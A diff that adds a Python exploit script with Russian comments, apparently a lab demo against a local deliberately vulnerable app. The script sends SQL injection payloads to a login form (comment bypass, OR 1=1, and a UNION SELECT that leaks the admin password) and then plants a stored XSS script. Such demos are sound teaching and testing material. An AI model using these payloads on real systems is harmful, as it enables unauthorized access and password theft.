@@ -1,0 +1,50 @@
+Сначала запустите app.py, затем: python exploit.py
+"""
+import urllib.request
+import urllib.parse
+import urllib.error
+
+BASE = "http://127.0.0.1:8000"
+
+
+def post(path, data):
+    body = urllib.parse.urlencode(data).encode()
+    req = urllib.request.Request(BASE + path, data=body, method="POST")
+    try:
+        with urllib.request.urlopen(req) as r:
+            return r.status, r.read().decode()
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode()
+
+
+def get(path):
+    with urllib.request.urlopen(BASE + path) as r:
+        return r.read().decode()
+
+
+print("=== Атака 1: SQL Injection ===")
+
+# 0) Обычный вход с неверным паролем - не пускает
+print("[0] Неверный пароль:", post("/login", {"username": "admin", "password": "wrong"}))
+
+# 1) Обход аутентификации: комментарий -- отбрасывает проверку пароля
+status, text = post("/login", {"username": "admin'--", "password": "anything"})
+print("[1] Обход пароля:", status, text)
+
+# 2) Классика: всегда истинное условие
+status, text = post("/login", {"username": "' OR '1'='1", "password": "' OR '1'='1"})
+print("[2] OR 1=1:", status, text)
+
+# 3) UNION: вытаскиваем пароль администратора прямо в ответ
+payload = "' UNION SELECT password, role FROM users WHERE username='admin'--"
+status, text = post("/login", {"username": payload, "password": "x"})
+print("[3] UNION (утечка пароля):", status, text)
+
+print("\n=== Атака 2: Stored XSS ===")
+xss = "<script>alert('XSS')</script>"
+post("/comment", {"author": "hacker", "text": xss})
+page = get("/")
+if xss in page:
+    print("[+] Скрипт сохранён и выдаётся другим пользователям БЕЗ экранирования!")
+else:
+    print("[-] Скрипт экранирован - уязвимость закрыта.")
